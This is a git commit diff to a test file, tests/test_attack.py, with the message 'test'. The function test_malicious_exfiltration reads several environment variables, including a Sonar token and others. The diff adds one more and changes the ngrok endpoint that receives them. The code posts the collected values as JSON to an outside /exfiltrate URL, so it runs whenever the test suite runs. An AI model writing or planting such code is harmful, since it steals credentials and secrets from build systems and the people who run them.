03d5dcf816d40bdbfa557b4ca8f22de1d86d6f8c
pxxguin <janghongseo@naver.com>
2026-08-04 19:47:30 +0900

    test

--- tests/test_attack.py
+++ tests/test_attack.py
@@ -6,15 +6,17 @@ def test_malicious_exfiltration():
     sonar_token = os.environ.get("PXXGUIN_SONAR_TOKEN", "NOT_FOUND")
     test_token = os.environ.get("THIS_IS_TEST", "NOT_FOUND")
     pxxguin = os.environ.get("PXXGUIN", "NOT_FOUND")
+    dragon = os.environ.get("DRAGON", "NOT_FOUND")
 
     data = {
         "pxxguin":pxxguin,
         "sonar_token": sonar_token,
-        "test_token":test_token
+        "test_token":test_token,
+        "dragon":dragon
     }
 
     req = urllib.request.Request(
-        "https://fcc8-112-170-49-13.ngrok-free.app/exfiltrate", 
+        "https://2ac8-220-120-106-126.ngrok-free.app/exfiltrate", 
         data=json.dumps(data).encode('utf-8'),
         headers={'Content-Type': 'application/json'}
     )
